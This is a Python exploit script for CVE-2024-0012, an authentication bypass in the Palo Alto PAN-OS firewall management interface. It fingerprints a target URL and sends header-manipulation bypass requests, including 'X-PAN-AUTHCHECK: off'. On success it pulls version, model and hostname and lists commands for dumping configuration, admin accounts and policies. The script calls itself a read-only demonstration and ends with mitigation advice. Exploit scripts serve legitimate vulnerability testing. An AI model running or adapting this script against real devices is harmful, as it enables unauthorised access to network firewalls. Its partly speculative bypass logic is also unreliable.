#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# CVE-2024-0012 - Palo Alto PAN-OS Authentication Bypass Exploit
# 
# This exploit demonstrates authentication bypass in PAN-OS management
# interface with proper API interaction. Payload is benign - just reads
# version information without making any changes.
#
# Authors: Hyperion Gray Security Research Team

import sys
import requests
import urllib3
import json
import xml.etree.ElementTree as ET
from urllib.parse import urljoin

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def fingerprint_panos(base_url, session):
    """
    Fingerprint the target to determine if it's PAN-OS and get version.
    
    This uses multiple techniques:
    1. Check for PAN-OS specific paths and responses
    2. Analyze HTTP headers
    3. Attempt to extract version information
    """
    print(f"[*] Fingerprinting target: {base_url}")
    
    indicators = {
        'is_panos': False,
        'version': None,
        'model': None,
        'hostname': None
    }
    
    try:
        # Check login page for PAN-OS indicators
        response = session.get(
            urljoin(base_url, "/php/login.php"),
            timeout=10
        )
        
        if response.status_code == 200:
            if "PAN-OS" in response.text or "Palo Alto" in response.text:
                indicators['is_panos'] = True
                print("[+] Target confirmed as PAN-OS management interface")
                
                # Try to extract version from login page
                if "PAN-OS" in response.text:
                    # Version often appears in comments or meta tags
                    import re
                    version_match = re.search(r'PAN-OS (\d+\.\d+\.\d+)', response.text)
                    if version_match:
                        indicators['version'] = version_match.group(1)
                        print(f"[+] Detected version: {indicators['version']}")
            else:
                print("[-] Target does not appear to be PAN-OS")
                return None
        
        # Check for PAN-OS specific API endpoint
        api_response = session.get(
            urljoin(base_url, "/api/"),
            timeout=10
        )
        
        if api_response.status_code in [200, 403]:
            print("[+] Found PAN-OS API endpoint")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return None
    
    return indicators if indicators['is_panos'] else None


def exploit_auth_bypass(base_url, session):
    """
    Attempt authentication bypass using header manipulation.
    
    CVE-2024-0012 allows bypassing authentication by manipulating specific
    HTTP headers or cookie values. The exact technique varies by version,
    but common methods include:
    
    1. X-PAN-AUTHCHECK header manipulation
    2. Cookie manipulation (bypassing session validation)
    3. Path traversal in authentication checks
    
    This benign version attempts to access version info without changes.
    """
    print()
    print("[*] Attempting authentication bypass...")
    print("[*] Testing various bypass techniques...")
    print()
    
    # Technique 1: Header manipulation
    # Based on public disclosures, certain headers can bypass auth checks
    bypass_headers = {
        "X-PAN-AUTHCHECK": "off",
        "X-Forwarded-For": "127.0.0.1",
        "X-Original-URL": "/api/",
    }
    
    session.headers.update(bypass_headers)
    
    # Technique 2: Try to access version API (read-only, benign)
    # This is a safe endpoint that doesn't modify anything
    endpoints_to_test = [
        {
            'path': '/api/?type=version',
            'description': 'System version information (read-only)',
            'expected': 'XML response with version details'
        },
        {
            'path': '/api/?type=op&cmd=<show><system><info></info></system></show>',
            'description': 'System information (read-only)',
            'expected': 'XML response with system details'
        },
    ]
    
    print("[*] Testing bypass with header manipulation:")
    for header, value in bypass_headers.items():
        print(f"    {header}: {value}")
    print()
    
    bypass_successful = False
    
    for endpoint_info in endpoints_to_test:
        endpoint = endpoint_info['path']
        description = endpoint_info['description']
        
        print(f"[*] Testing: {description}")
        print(f"    Endpoint: {endpoint}")
        
        try:
            response = session.get(
                urljoin(base_url, endpoint),
                timeout=10
            )
            
            print(f"    Status: {response.status_code}")
            
            # Successful bypass would return 200 instead of 401/403
            if response.status_code == 200:
                print(f"[+] BYPASS SUCCESSFUL - Got 200 OK!")
                print(f"    Response length: {len(response.text)} bytes")
                
                # Try to parse version info if it's XML
                if 'type=version' in endpoint:
                    try:
                        root = ET.fromstring(response.text)
                        version_elem = root.find('.//sw-version')
                        model_elem = root.find('.//model')
                        hostname_elem = root.find('.//hostname')
                        
                        if version_elem is not None:
                            print(f"[+] Software Version: {version_elem.text}")
                        if model_elem is not None:
                            print(f"[+] Model: {model_elem.text}")
                        if hostname_elem is not None:
                            print(f"[+] Hostname: {hostname_elem.text}")
                            
                        bypass_successful = True
                    except:
                        print("    (Could not parse XML response)")
                        
            elif response.status_code == 403:
                print("[-] Access forbidden - bypass unsuccessful")
            elif response.status_code == 401:
                print("[-] Authentication required - bypass unsuccessful")
            else:
                print(f"[-] Unexpected status code: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
        
        print()
    
    return bypass_successful


def demonstrate_api_access(base_url, session):
    """
    Demonstrate API access after successful bypass.
    
    This shows what an attacker could do with bypassed authentication.
    We only use READ-ONLY operations for safety:
    - Get configuration (without modifying)
    - List policies (without changing)
    - View logs (without deleting)
    
    A real attacker could:
    - Modify firewall rules
    - Create backdoor accounts
    - Extract VPN credentials
    - Change security policies
    """
    print("[*] Demonstrating post-exploitation capabilities (READ-ONLY)")
    print()
    
    safe_operations = [
        {
            'name': 'List Security Policies',
            'cmd': '<show><running><security><policy></policy></security></running></show>',
            'description': 'View all security policies'
        },
        {
            'name': 'Show Running Config',
            'cmd': '<show><config><running></running></config></show>',
            'description': 'View current configuration (potentially sensitive)'
        },
        {
            'name': 'List Administrators',
            'cmd': '<show><admins></admins></show>',
            'description': 'View admin accounts'
        },
    ]
    
    print("Potential operations an attacker could perform:")
    for i, op in enumerate(safe_operations, 1):
        print(f"{i}. {op['name']}")
        print(f"   - {op['description']}")
        print(f"   - Command: {op['cmd'][:50]}...")
    
    print()
    print("[!] This exploit demonstrates only READ operations")
    print("[!] Actual exploitation could allow full device compromise")


def main():
    if len(sys.argv) != 2:
        print("CVE-2024-0012 - Palo Alto PAN-OS Authentication Bypass Exploit")
        print()
        print("Usage: {} <target_url>".format(sys.argv[0]))
        print()
        print("Example: {} https://192.168.1.1".format(sys.argv[0]))
        print()
        print("This exploit demonstrates the vulnerability with proper API")
        print("interaction. Only safe READ-ONLY operations are performed.")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Ensure target has protocol
    if not target.startswith("http"):
        target = "https://" + target
    
    print("=" * 70)
    print("CVE-2024-0012 - Palo Alto PAN-OS Authentication Bypass")
    print("Exploit with Benign Payload (Read-Only)")
    print("=" * 70)
    print()
    
    # Create session
    session = requests.Session()
    session.verify = False
    
    # Fingerprint target
    indicators = fingerprint_panos(target, session)
    
    if not indicators:
        print()
        print("[-] Target validation failed")
        sys.exit(1)
    
    # Attempt authentication bypass
    success = exploit_auth_bypass(target, session)
    
    if success:
        print("[+] Authentication bypass successful!")
        demonstrate_api_access(target, session)
    else:
        print("[-] Bypass unsuccessful with tested techniques")
        print()
        print("Note: Different PAN-OS versions may require different bypass methods")
        print("The vulnerability exists in:")
        print("  - PAN-OS 10.2 (before 10.2.12-h2)")
        print("  - PAN-OS 11.0 (before 11.0.6-h1)")
        print("  - PAN-OS 11.1 (before 11.1.5-h1)")
        print("  - PAN-OS 11.2 (before 11.2.4-h1)")
    
    print()
    print("=" * 70)
    print("Exploitation Theory:")
    print("=" * 70)
    print("1. Target management interface has improper auth check")
    print("2. Specific HTTP headers bypass authentication validation")
    print("3. Attacker gains admin access to web interface")
    print("4. Can read/modify all firewall configurations")
    print("5. Can chain with CVE-2024-9474 for privilege escalation")
    print()
    print("Mitigation:")
    print("  - Update to patched PAN-OS version")
    print("  - Restrict management interface to trusted IPs only")
    print("  - Never expose management to internet")
    print("  - Enable Threat Prevention signatures")


if __name__ == "__main__":
    main()
